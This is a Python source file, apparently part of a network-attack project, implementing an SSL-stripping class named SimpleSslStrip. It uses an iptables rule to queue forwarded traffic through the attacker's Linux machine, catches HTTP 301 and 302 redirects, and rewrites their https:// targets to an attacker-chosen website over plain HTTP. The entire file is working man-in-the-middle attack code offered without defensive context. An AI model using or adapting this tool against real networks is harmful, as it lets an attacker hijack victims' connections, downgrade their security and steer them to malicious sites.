from scapy.all import *
import time
import threading
import re

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.l2 import Ether

from netfilterqueue import NetfilterQueue

global listening
global list_of_dns


# intercepts switch to https from server, redirects to chosen website
class SimpleSslStrip:
    # intiializes the desired ip to redirect to
    def __init__(self, attacker_website_redirect):
        self.attacker_website_redirect = attacker_website_redirect

    # processes the packets coming through the linux machine
    def process_http_response(self, packet):
        my_packet = IP(packet.get_payload())

        if my_packet.haslayer(Raw):
            my_load = my_packet[Raw].load.decode('latin-1')

            # checks if it is a http redirect
            if my_load.find("301") != -1 or my_load.find("302") != -1:
                my_packet = self.modify_packet(my_packet, my_load)
                packet.set_payload(bytes(my_packet))

        packet.accept()

    # modify the http redirect package to redirect to the desired atacker's website
    def modify_packet(self, packet, load):
        pattern = b"https://[^/]+"
        replacement = "http://{}".format(self.attacker_website_redirect)
        replacement = replacement.encode("ascii")

        load = re.sub(pattern, replacement, load.encode('latin-1')).decode('latin-1')

        packet[Raw].load = load.encode('latin-1')
        packet[TCP].chksum = None
        packet[TCP].dataofs = None
        packet[IP].len = None
        packet[IP].chksum = None

        return packet

    # execute the strip
    def execute_stripping(self):
        QUEUE_NUMBER = 5
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))

        the_queue = NetfilterQueue()

        try:
            the_queue.bind(QUEUE_NUMBER, self.process_http_response)
            the_queue.run()
        except KeyboardInterrupt:
            the_queue.unbind()
